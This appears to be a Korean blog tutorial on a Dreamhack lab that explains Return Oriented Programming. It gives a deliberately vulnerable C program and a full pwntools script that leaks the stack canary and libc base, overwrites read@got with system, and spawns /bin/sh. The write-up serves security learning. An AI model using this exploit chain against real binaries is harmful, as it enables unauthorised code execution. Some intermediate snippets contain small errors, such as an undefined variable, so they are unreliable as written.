---
layout: post
title: Theory | ROP
subtitle: Return Oriented Programming
categories: Thoery
tags: [Pwnable, dreakhack, Pentest]
---

**본 내용은 Dreamhack을 통해 보실 수 있습니다.**

제가 문제를 풀이해보면서 이해 해온 내용을 토대로 해당 이론을 진행하겠습니다. 틀린 부분이 있을 수도 있으므로, 다른 자료를 같이 검색해보면서 진행하시면 좋을 것으로 예상됩니다.

## ROP

**Return Oriented Programming(ROP)**는 NX bit와 ASLR 같은 메모리 보호 기법을 우회하기 위한 공격기법으로, **Return To Libc(RTL), RTL Chaning, GOT Overwrite** 기법을 활용하여 콜 스택을 제어하는 공격 기법이다. 

그리고 다수의 리턴 가젯을 연결해서 사용하여 기존 Return을 변경하여 프로그래밍 하듯이 필요로 하는 함수 호출을 연계하고 조작한다.

실습을 통해 해당 내용을 계속 설명하겠습니다.

### 코드

```C
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie
#include <stdio.h>
#include <unistd.h>
int main() {
  char buf[0x30];
  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);
  return 0;
}
```

해당 코드에서는 `system`의 함수 호출과 `/bin/sh`의 문자열이 포함되어 있지 않습니다.

1. 주어진 buf의 크기보다 더 입력을 받는 `read(0, buf, 0x100);`를 통해 Canary leak을 진행합니다. (**Canary**는 `rbp` 혹은 `ebp` 위에 임의의 문자열로, 해당 값이 변경되는 것을 감지하여 프로세스를 종료 시키는 것으로 일종의 메모리 보호 기법이다)

2. 코드 상에서 존재하지 않는 `system`의 주소를 계산한다.

3. `"/bin/sh"`의 문자열을 찾는다.

4. **GOT Overwrite**를 진행한다.

### 1. Canary

```C
  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);
```

Canary의 위치까지 입력하여 해당 Canary를 받아오면 된다. Canary는 `rbp` 혹은 `ebp` 위에 OS 32bit 기준 4byte, 64bit 기준 8byte의 크기만큼 쌓여 있다.

따라서, buf로부터 Canary 위치까지 입력하게 된다면 해당 값을 받아올 수 있다.

```python
from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = process('./rop')
e = ELF("./rop")
libc = ELF("./libc-2.27.so")

# [1] Leak Canary
buf = b'A'*57
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
slog("Canary", canary)
```

해당 코드를 실행하게 되면 Canary값을 받아 올 수 있다.

### 2. System 주소

`system` 함수는 **libc**에 정의되어 있고, `read, puts, printf` 등 여러 함수도 정의되어 있다. 해당 라이브러리 파일은 메모리에 매핑될 때, 다른 함수들과 함께 `system`함수도 프로세스 메모리에 적재된다.

하지만, 해당 코드 즉, 바이너리에서는 `system`함수를 직접 호출하지 않아 GOT에 등록되어 있지 않고, `read, puts, printf`는 GOT에 등록되어 있다.

libc는 여러 버전이 있지만, **같은 libc안에서는 함수간의 사이 거리(Offset)는 항상 같다.**

이 점을 이용해 GOT에 등록된 `read, puts, printf`로 함수의 GOT값을 읽고, `system`과의 거리를 구해 `system`의 실 주소를 구할 수 있다.

read의 GOT 값을 읽기 위해 puts를 활용하여 `read@got` 주소를 읽어오고, **해당 값**과 **read의 offset**를 빼면 libc_base 즉, 라이브러리의 절대 주소가 나온다. 해당 값에 **system의 offset**을 더하면 `system@got`가 되는 것이다.

```python
read_plt = e.plt['read'] # read 함수 호출
read_got = e.got['read'] # read@got 주소 확인용
puts_plt = e.plt['puts'] # puts 함수 호출
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
#####
# ROPgadget --binary ./rop | grep "pop [Register]"
# pop_rdi = 0x00000000004007f3
# pop_rsi_r15 = 0x00000000004007f1
#####

#####
# payload += p64(ret)  # stack alignment to prevent errors caused by movaps
# Stack alignment : 16 Byte단위로 정렬하는 것, 아무 의미 없는 ret 가젯 대입
#####

# puts(read@got)
payload += p64(pop_rdi) + p64(read_got)  # puts(read@got)
payload += p64(puts_plt)                 # puts(read@got) 호출
```

* 기존 **ret**를 `pop rdi read_get puts_plt`를 통해 `puts(read@got)` : **read@got**의 주소를 화면에 출력한다. 

```python
p.sendafter("Buf: ", payload)         # puts()와 read got를 이용해서 read() 주소 출력
read = u64(p.recvn(6)+b'\x00'*2)      # 화면에 출력된 read() 주소를 read에 대입
lb = read - libc.symbols["read"]      # libc base = read 주소 - read symbols
system = lb + libc.symbols["system"]  # system 주소
```

* 처음에 설명드린 것과 같이 등록된 `read, puts, printf`로 함수의 GOT값을 읽고, `system`과의 거리를 구해 `system`의 주소를 넣으면 된다.

* 여태 사용된 payload를 전송하게 된다면, `puts(read@got)`가 되어, `read@got`를 출력하게 된다. 해당 값은 read@got의 값 **0x601030**을 Little Endian으로 출력한다.

* 64bit에서는 8byte 단위로 진행하므로 **\x00**을 두 번 더해 메모리에서 인식할 수 있는 단위로 변경해준다. 이 값을 read의 offset **libc.symbols["read"]**를 빼 LIBC_BASE를 구한다.

* LIBC_BASE에 system의 offset를 더한다면 우리가 원하는 `system`의 주소를 구하게 되는 것이다. 

### 3. "/bin/sh"

바이너리에 `"/bin/sh"`문자열이 존재하지 않기에 버퍼에 주입하거나, libc에 포함된 문자열을 찾는 것이다. **bss**에 `"/bin/sh"`를 넣어 bss를 스택에 넣는 방법이 있지만, 이번에는 버퍼에 직접 입력하고, 참조하는 방식을 진행하겠습니다.

```python
# read("/bin/sh") => system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)    # read 함수의 첫번째 인자 값 ("/bin/sh") read_got+0x8 : read_got 시 사용될 인자
payload += p64(read_plt)              # read("/bin/sh") 호출
```

* read@got를 호출 시 해당 인자를 참조하는 곳이 **read@got+0x8**이다. 따라서, read(`"/bin/sh"`)를 하기 위해 인자가 하나이므로, pop rdi 가젯을 이용하고 해당 인자를 참조할 수 있게 **read@got+0x8**를 넣고 read 호출한다.

### 4. **GOT Overwrite**

```python
# read(0, read@got, 0) => read@got -> system
payload += p64(pop_rdi) + p64(0)      # read(0, , )
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)    # read(0, read@got, 0)
payload += p64(read_plt)        # read(0, read@got, 0) 호출
```

* `read()` 함수는 총 3개의 인자를 받으므로 **pop rdi; pop rsi; pop rdx; ret;**의 가젯이 필요하다. 하지만 ROPgadget으로 확인해보면, 첫번째 인자 받기로 `pop rdi ; ret` 하나와, 두번째 인자 받기로 `pop rsi ; pop r15 ; ret`만 존재한다. (**r15**의 경우는 사용하지 않으므로 어떠한 값을 넣던 상관이 없다.)

* 그렇다면, 우리는 rdx의 값을 변경할 수 없으므로, 기본적으로 rdx의 값이 크기를 바래야한다.(_Ubuntu 20.04에서는 rdx가 **0**으로 고정이 되어있다._) 그렇지 않다면 **libc_csu_init** 기법을 사용해야한다.

* rsi에 **read@got** 주소를 넣으므로, read 호출 시, **read@got**를 호출한다. 이 때, 해당 값을 **system@got(system의 주소)**를 넣게 된다면 `system`를 호출하게 된다.

### Stack

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/193451995-1ee666fc-d8c3-4362-9059-fa6f6a891f14.jpg" width = 350>
</p>

### Exploit

해당 코드들을 payload 순서에 맞게 적절히 넣어서 실행하면 된다.

```python
from pwn import *

context.log_level = 'debug'

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = process('./rop') # remote Dreamhack
e = ELF("./rop")
#libc = ELF("./libc-2.27.so")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = ROP(e)

# [1] Leak Canary
buf = b'A'*57
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
slog("Canary", canary)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
#pop_rdi = 0x00000000004007f3
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
#pop_rsi_r15 = 0x00000000004007f1

payload = b'A'*56 + p64(canary) + b'B'*8

# puts(read@got)
payload += p64(pop_rdi) + p64(read_got) # puts(read@got)
payload += p64(puts_plt)        # puts(read@got) 호출

# read(0, read@got, 0) => read@got -> system
payload += p64(pop_rdi) + p64(0)        # read(0, , )
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)    # read(0, read@got, 0)
payload += p64(read_plt)        # read(0, read@got, 0) 호출
# read("/bin/sh") => system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)    # read 함수의 첫번째 인자 값 ("/bin/sh") read_got+0x8 : read_got 시 사용될 인자
payload += p64(read_plt)        # read("/bin/sh") 호출

p.sendafter("Buf: ", payload)   # puts()와 read got를 이용해서 read() 주소 출력
read = u64(p.recvn(6)+b'\x00'*2)      # 화면에 출력된 read() 주소를 read에 대입
lb = read - libc.symbols["read"]        # libc base = read 주소 - read symbols
system = lb + libc.symbols["system"]    # system = libc base + system symbols
slog("read.symbols", libc.symbols["read"])
slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.send(p64(system)+b"/bin/sh\x00")
p.interactive()
```

> 해당 문제에서는 libc의 버전을 다르게 참조하여 기존에 사용하는 libc와는 offset 차이가 있을 것으로 보인다. 그렇기에 문제에서 제공해주는 libc를 참조하게 되면 해결할 수 있다.